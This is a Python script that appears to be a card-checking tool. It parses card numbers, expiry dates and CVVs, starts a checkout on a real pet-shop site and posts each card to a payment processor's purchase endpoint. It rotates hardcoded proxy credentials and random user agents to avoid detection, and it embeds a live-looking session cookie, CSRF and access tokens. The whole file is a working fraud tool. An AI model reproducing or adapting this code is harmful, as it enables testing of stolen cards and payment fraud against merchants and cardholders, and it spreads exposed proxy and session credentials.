import requests
from fake_useragent import UserAgent

proxies_list = [
    "proxy.toolip.io:31113:4940b115:4u4cc1mct8yj",
    "proxy.toolip.io:31114:b7e015a9:4u4cc1mct8yj",
    "proxy.toolip.io:31111:05591028:4u4cc1mct8yj",
    "proxy.toolip.io:31112:39c5f078:4u4cc1mct8yj",
    "proxy.toolip.io:31113:1769379b:4u4cc1mct8yj"
]
proxy_index = 0
ua = UserAgent()

def get_next_session():
    global proxy_index
    proxy = proxies_list[proxy_index % len(proxies_list)]
    proxy_index += 1
    host, port, user, pwd = proxy.split(":")
    proxy_url = f"http://{user}:{pwd}@{host}:{port}"
    session = requests.Session()
    session.proxies.update({"http": proxy_url, "https": proxy_url})
    return session

def Tele(ccx):
    ccx = ccx.strip()
    n = ccx.split("|")[0]
    mm = ccx.split("|")[1]
    yy = ccx.split("|")[2]
    cvc = ccx.split("|")[3]

    if "20" in yy:
        yy = yy.split("20")[1]

    user_agent = ua.random
    import requests
    import json
    import re
    url = "https://www.petswyak.com/shop/payment/transaction/1458"

    payload = {
      "id": 6,
      "jsonrpc": "2.0",
      "method": "call",
      "params": {
        "provider_id": 21,
        "payment_method_id": 209,
        "token_id": None,
        "amount": None,
        "flow": "redirect",
        "tokenization_requested": False,
        "landing_route": "/shop/payment/validate",
        "is_validation": False,
        "access_token": "4395dba2-b54d-48f6-8909-60f59673e106",
        "csrf_token": "58289f6983571689642dd67fc2fe58b5d7c4cf39o1779310008"
      }
    }

    headers = {
      'User-Agent': user_agent,
      'Content-Type': "application/json",
      'sec-fetch-site': "same-origin",
      'accept-language': "en-US,en;q=0.9",
      'sec-fetch-mode': "cors",
      'origin': "https://www.petswyak.com",
      'referer': "https://www.petswyak.com/shop/payment",
      'sec-fetch-dest': "empty",
      'Cookie': "tz=Asia/Beirut; session_id=d90a30584d44794ab2cacbd66aa1f353d49e6681; im_livechat_history=[\"/web/login\",\"/my\",\"/\",\"/shop/cart\",\"/shop/address?partner_id=3395&mode=billing\",\"/shop/address\",\"/shop/address?partner_id=3396&mode=shipping\",\"/shop/extra_info\",\"/shop/payment\"]; _gcl_au=1.1.1732164536.1747756424; website_cookies_bar={\"required\": true,\"optional\": true}; frontend_lang=en_US"
    }

    response = requests.post(url, data=json.dumps(payload), headers=headers)
    html = response.json()['result'].get('redirect_form_html', '')
    id = re.search(r'payment_id=([A-Z0-9]+)', html).group(1) if re.search(r'payment_id=([A-Z0-9]+)', html) else None
    url = "https://secure.tesspayments.com/Pay/MCPaymentPage"

    params = {
      'card': "credit",
      'paymentID': id
    }

    headers = {
      'User-Agent': user_agent,
      'Accept': "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
      'sec-fetch-site': "same-origin",
      'sec-fetch-dest': "document",
      'accept-language': "en-US,en;q=0.9",
      'sec-fetch-mode': "navigate",
      'referer': f"https://secure.tesspayments.com/payments/checkout?payment_id={id}"
    }

    response = requests.get(url, params=params, headers=headers)
    token = re.search(r'&quot;token&quot;:&quot;([^&]+)&quot;', response.text).group(1)
    url = "https://checkout.tesspayments.com/processing/purchase/card"

    payload = {
      "billingAddress": {
        "phone": "+15572552539",
        "country": "QA"
      },
      "browserInfo": {
        "colorDepth": 24,
        "javaEnabled": False,
        "javaScriptEnabled": True,
        "language": "en-US",
        "screenHeight": 896,
        "screenWidth": 414,
        "timeZoneOffset": -180,
        "userAgent": user_agent,
        "platform": "MacIntel"
      },
      "card": n,
      "cvv": cvc,
      "email": "okmotherfucker1235@gmail.com",
      "expiryDate": mm+yy,
      "inputType": "text",
      "month": mm,
      "name": "ALI HA",
      "panBrandLogo": "brand-logo-visa",
      "year": yy
    }

    headers = {
      'User-Agent': user_agent,
      'Accept': "application/json, text/plain, */*",
      'Content-Type': "application/json",
      'content-type': "application/json;charset=utf-8",
      'x-requested-with': "XMLHttpRequest",
      'sec-fetch-site': "same-origin",
      'accept-language': "en-US,en;q=0.9",
      'sec-fetch-mode': "cors",
      'token': token,
      'origin': "https://checkout.tesspayments.com",
      'referer': "https://checkout.tesspayments.com/",
      'sec-fetch-dest': "empty"
    }

    r2 = requests.post(url, data=json.dumps(payload), headers=headers)
    return r2.json()